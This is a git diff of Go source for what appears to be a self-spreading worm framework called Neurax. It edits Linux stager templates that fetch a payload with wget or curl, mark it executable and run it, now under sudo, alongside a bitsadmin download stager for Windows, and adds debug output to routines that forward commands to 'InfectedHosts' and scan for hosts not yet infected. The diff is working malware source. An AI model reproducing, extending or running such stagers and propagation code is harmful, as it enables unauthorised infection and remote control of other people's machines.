@@ -147,8 +147,8 @@ func NeuraxStager() string {
 		[]string{"bitsadmin", `bitsadmin /transfer update /priority high URL SAVE_PATH\FILENAME && B64 SAVE_PATH\FILENAME`},
 	}
 	linux_stagers := [][]string{
-		[]string{"wget", `wget -O SAVE_PATH/FILENAME URL; B64 chmod +x SAVE_PATH/FILENAME; SAVE_PATH./FILENAME`},
-		[]string{"curl", `curl URL/FILENAME > SAVE_PATH/FILENAME; B64 chmod +x SAVE_PATH/FILENAME; SAVE_PATH./FILENAME`},
+		[]string{"wget", `sudo wget -O SAVE_PATH/FILENAME URL; sudo B64 chmod +x SAVE_PATH/FILENAME; sudo SAVE_PATH./FILENAME`},
+		[]string{"curl", `sudo curl URL/FILENAME > SAVE_PATH/FILENAME; sudo B64 chmod +x SAVE_PATH/FILENAME; sudo SAVE_PATH./FILENAME`},
 	}
 	linux_save_paths := []string{"/tmp/", "/lib/", "/home/",
 		"/etc/", "/usr/", "/usr/share/"}
@@ -330,6 +330,7 @@ func handle_command(cmd string) {
 			}
 		}
 		if strings.Contains(preamble, "a") && !no_forward {
+			fmt.Println(InfectedHosts)
 			for _, host := range InfectedHosts {
 				err := DataSender(host, NeuraxConfig.CommPort, fmt.Sprintf("%s %s", forwarded_preamble, cmd))
 				ReportError("Cannot send command", err)
@@ -443,7 +444,9 @@ func neurax_scan_active(c chan string) {
 	}
 	targets = coldfire.RemoveFromSlice(targets, coldfire.GetLocalIp())
 	for _, target := range targets {
+		fmt.Println("Scanning ", target)
 		if IsHostActive(target) && !IsHostInfected(target) {
+			fmt.Println("Scanned ", target)
 			c <- target
 		}
 	}
